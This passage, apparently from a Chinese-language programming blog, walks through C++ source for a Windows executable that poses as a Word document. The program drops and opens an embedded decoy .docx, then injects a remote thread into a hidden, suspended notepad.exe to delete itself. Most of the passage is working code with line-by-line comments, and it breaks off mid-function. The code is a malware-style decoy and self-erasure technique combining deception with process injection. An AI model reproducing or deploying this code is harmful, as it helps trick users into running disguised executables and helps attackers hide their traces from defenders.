(wDeleteFileA)</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-&gt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dwDeleteFile</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>将结构体成员 <code>dwDeleteFile</code> 强制转换为 <code>wDeleteFileA</code> 类型，并赋值给 <code>kDeleteFileA</code>。这样，<code>kDeleteFileA</code> 就指向 <code>DeleteFileA</code> 函数。</p></li><li><p>调用函数删除文件</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">kDeleteFileA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-&gt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dwDeleteFile_param_1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li></ul><hr><h3 id="main" tabindex="-1"><a class="header-anchor" href="#main"><span>main</span></a></h3><p>main 函数实现了如下功能</p><ol><li>从资源中提取一个 <code>.docx</code> 文件，并将其保存到磁盘上。</li><li>打开这个 <code>.docx</code> 文件。</li><li>通过创建和注入远程线程的方式，让另一个进程（<code>notepad.exe</code>）删除当前程序（自删除）。</li></ol><hr><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">int</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> main</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">int</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> argc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">char*</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> argv</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[])</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    CHAR </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">PathFileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[MAX_PATH] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> };</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    CHAR </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[MAX_PATH] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> };</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    // 1. 从资源中提取 \`.docx\` 文件</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    HRSRC Resource </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> FindResourceA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">MAKEINTRESOURCEA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">101</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">), </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;docx&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //得到资源文件HRSRC句柄</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    HGLOBAL ResourceGlobal </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> LoadResource</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, Resource);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //得到资源文件ResourceGlobal句柄</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    DWORD FileSize </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> SizeofResource</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, Resource);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //得到资源文件的大小</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    LPVOID PFILE </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> LockResource</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(ResourceGlobal);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //得到指向资源文件内容的指针</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    GetModuleFileNameA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, PathFileName, MAX_PATH);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //当前进程的路径和名称</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    strcpy_s</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(FileName, </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">strrchr</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(PathFileName, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    /*</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    strrchr得到第二个参数最后出现的位置</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    d:\\\\xxxxx\\\\xxxxxx\\\\xxxx.exe在执行后得到\\\\xxxx.exe</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    所以需要+1把\\\\去掉</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    最后得到了完整的文件名</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    用strcpy_s把文件名复制到FileName中</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    */</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">size_t</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> MAX_PATH; i</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">++</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;.&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">            FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;d&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">            FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;o&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">            FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;c&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">            FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 4</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;x&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">            break</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    }</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //循环找文件名中的.，找到后将文件名的后缀改为docx</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //这个步骤主要是为了方便，以后只需要改exe的名称不需要到代码中来改</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    HANDLE FILE </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> CreateFileA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(FileName, FILE_ALL_ACCESS, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, CREATE_ALWAYS, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //创建文件名相同的文件</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    DWORD dwSize;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    WriteFile</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(FILE, PFILE, FileSize, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">dwSize, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    // 把资源文件中的内容写入</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    // 2. 打开 .docx 文件</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    SHELLEXECUTEINFOA shellexecute </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> };</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    shellexecute</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">cbSize</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> =</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> sizeof</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(shellexecute);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    shellexecute</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">lpFile</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> FileName;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    shellexecute</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">nShow</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> SW_SHOW;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    ShellExecuteExA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">shellexecute);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //打开docx文件</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    // 3. 实现自删除</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //下面是实现自删除，网上的自删除方法有很多，用的多的是批处理，这里是创建一个进程然后用远程线程注入来让notepad删除当前程序</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    STARTUPINFOA si </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> };</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    PROCESS_INFORMATION  pi </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> };</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    CreateProcessA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;c:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">windows</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">system32</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">notepad.exe&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, TRUE, CREATE_NO_WINDOW </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">|</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> CREATE_SUSPENDED, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">si, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">pi);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //创建进程</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    DeleteStruct DS;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    DS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dwDeleteFile</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> =</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> GetProcAddress</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">GetModuleHandleA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;kernel32.dll&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">), </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;DeleteFileA&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    GetModuleFileNameA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dwDeleteFile_param_1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, MAX_PATH);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //创建远程线程不能直接使用API，需要把函数指针放在结构中传过去</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //这里需要DeleteFileA这个函数，用GetProcAddress得到指针后传过去</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    LPVOID ADDRESS </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> VirtualAllocEx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2048</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    WriteProcessMemory</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, ADDRESS, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">threadProc, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2048</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //为函数开辟一块内存</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    LPVOID pRemoteParam </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> VirtualAllocEx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">sizeof</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(DS), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    WriteProcessMemory</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, pRemoteParam, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DS, </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">sizeof</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(DS), </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    DWORD RETSIZE;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //为参数开辟一块内存</span></span>
